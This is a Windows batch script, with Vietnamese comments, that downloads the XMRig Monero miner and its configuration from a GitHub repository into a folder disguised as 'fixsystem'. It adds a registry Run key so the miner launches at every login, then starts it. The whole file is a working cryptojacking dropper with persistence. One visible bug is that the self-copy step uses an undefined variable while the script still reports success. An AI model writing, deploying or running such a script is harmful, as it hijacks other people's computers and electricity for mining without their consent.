@echo off
setlocal enabledelayedexpansion

:: ===================== CÀI ĐẶT =====================
set "mainFile=main.cmd"
set "DOWNLOAD_DIR=%SystemDrive%\fixsystem"
if not exist "%DOWNLOAD_DIR%" mkdir "%DOWNLOAD_DIR%"

if not exist "%DOWNLOAD_DIR%\xmrig.exe" (
    echo Tải xmrig.exe...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/VNGteam/minecoinXmr_VNG/raw/main/xmrig.exe' -OutFile '%DOWNLOAD_DIR%\xmrig.exe'"
)

if not exist "%DOWNLOAD_DIR%\start.cmd" (
    echo Tải start.cmd...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/VNGteam/minecoinXmr_VNG/raw/main/start.cmd' -OutFile '%DOWNLOAD_DIR%\start.cmd'"
)

if not exist "%DOWNLOAD_DIR%\config.json" (
    echo Tải config.json...
    powershell -Command "Invoke-WebRequest -Uri 'https://github.com/VNGteam/minecoinXmr_VNG/raw/main/config.json' -OutFile '%DOWNLOAD_DIR%\config.json'"
)


:: Sao chép file hiện tại
copy "%0" "%targetDir%\%mainFile%" >nul
echo Đã sao chép file chính vào %SystemDrive%\fixsystem


:: ========= THIẾT LẬP TỰ CHẠY ==========
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MinecoinXMR" /t REG_SZ /d "%SystemDrive%\fixsystem\start.cmd" /f
echo Đã thêm vào khởi động Windows

:: ========== CHẠY START.CMD ===========
if exist "%SystemDrive%\fixsystem\start.cmd" (
    echo Đang khởi chạy start.cmd...
    call "%SystemDrive%\fixsystem\start.cmd"
)

echo Cài đặt hoàn tất!
pause